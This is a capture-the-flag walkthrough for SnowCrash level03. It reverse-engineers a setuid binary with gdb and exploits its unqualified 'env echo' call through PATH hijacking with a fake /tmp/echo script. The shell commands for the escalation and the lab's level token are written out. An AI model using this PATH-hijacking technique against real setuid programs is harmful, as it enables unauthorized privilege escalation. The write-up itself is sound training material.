# Level 03

## Description

Ok, let's see what we have here :

```
level03@SnowCrash:~$ ls
level03
```

Let's try to run it :

```
level03@SnowCrash:~$ ./level03
Exploit me
```

Let's see its permissions :

```
level03@SnowCrash:~$ ls -la level03

-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```

Ok, so this is a binary that runs with the privileges of the file's current owner = 's' flag (here, interestingly the owner is the user "flag03")

Interesting... so maybe we need to reverse-engineer it...

Let's use gdb to do that :

```
level03@SnowCrash:~$ gdb ./level03
(gdb) disas main

0x080484a4 <+0>:     push   %ebp
0x080484a5 <+1>:     mov    %esp,%ebp
0x080484a7 <+3>:     and    $0xfffffff0,%esp
0x080484aa <+6>:     sub    $0x20,%esp
0x080484ad <+9>:     call   0x80483a0 <getegid@plt>
0x080484b2 <+14>:    mov    %eax,0x18(%esp)
0x080484b6 <+18>:    call   0x8048390 <geteuid@plt>
0x080484bb <+23>:    mov    %eax,0x1c(%esp)
0x080484bf <+27>:    mov    0x18(%esp),%eax
0x080484c3 <+31>:    mov    %eax,0x8(%esp)
0x080484c7 <+35>:    mov    0x18(%esp),%eax
0x080484cb <+39>:    mov    %eax,0x4(%esp)
0x080484cf <+43>:    mov    0x18(%esp),%eax
0x080484d3 <+47>:    mov    %eax,(%esp)
0x080484d6 <+50>:    call   0x80483e0 <setresgid@plt>
0x080484db <+55>:    mov    0x1c(%esp),%eax
0x080484df <+59>:    mov    %eax,0x8(%esp)
0x080484e3 <+63>:    mov    0x1c(%esp),%eax
---Type <return> to continue, or q <return> to quit---
0x080484e7 <+67>:    mov    %eax,0x4(%esp)
0x080484eb <+71>:    mov    0x1c(%esp),%eax
0x080484ef <+75>:    mov    %eax,(%esp)
0x080484f2 <+78>:    call   0x8048380 <setresuid@plt>
0x080484f7 <+83>:    movl   $0x80485e0,(%esp)
0x080484fe <+90>:    call   0x80483b0 <system@plt>
0x08048503 <+95>:    leave  
0x08048504 <+96>:    ret  
```

This is equivalent to something like this in C :

```c
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <stdint.h>

int main(int argc, char **argv, char **envp)
{
    __gid_t gid;
    __uid_t uid;
  
    gid = getegid();				// store our effective group GID inside a variable named "gid"
    uid = geteuid();				// store our effective user UID inside a variable named "uid"

    setresgid(gid, gid, gid);			// we set/overwrite the RGID, EGID and SGID of the current executing process as the value of "gid", which is the effective group GID from the "getegid()" function
    setresuid(uid, uid, uid);			// we set/overwrite the RID, EUID and SUID of the current executing process as the value of "uid", which is the effective group GID from the "geteuid()" function

    return (system("/usr/bin/env echo Exploit me"));  
}
```

**Note :**

```
RGID (Real Group ID) = The group of the user who started the process (the program execution)
EGID (Effective Group ID) = The group whose permissions are currently used for access checks. Here the EUID becomes the owner of the file because the binary is "setuid", as we saw above, so geteuid() returns the UID of the privileged account that owns the binary (flag03 that can run the getflag).
SGID (Saved Group ID) = A stored copy of a privileged group ID that allows the process to regain that group later.
```

So, how can we take advantage of this program ?

So, we can see that when we run this program, it makes us an elevated user and then runs an "echo" with a string... It also uses the "env" before the "echo", so it searches in the PATH variable to find/build echo...

This means that if we :

- create a program named "echo"
- write inside it "/bin/getflag"
- put it in the "/tmp" directory of our system
- add the "/tmp" directory in the PATH (in the begining)

so everytime we run the "./level03" program, we become an elevated user and run the "/bin/getflag" as an evelated user, so we can get the flag to the next level without needing to first log in to the account "flag03" to have the rights to run "getflag" :

```
level03@SnowCrash:~$ echo "/bin/getflag" > /tmp/echo
level03@SnowCrash:~$ chmod +x /tmp/echo
level03@SnowCrash:~$ export PATH=/tmp:$PATH
```

`export PATH=/tmp:$PATH` puts/appends "/tmp" at the front of the PATH string, so if PATH was `/usr/local/bin:/usr/bin:/bin`, after the export it becomes: `/tmp:/usr/local/bin:/usr/bin:/bin`. The shell searches PATH left to right and stops at the first match.

```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

level03@SnowCrash:~$ su level04
Password: qi0maab88jeaj46qoumi7maus

level04@SnowCrash:~$
```
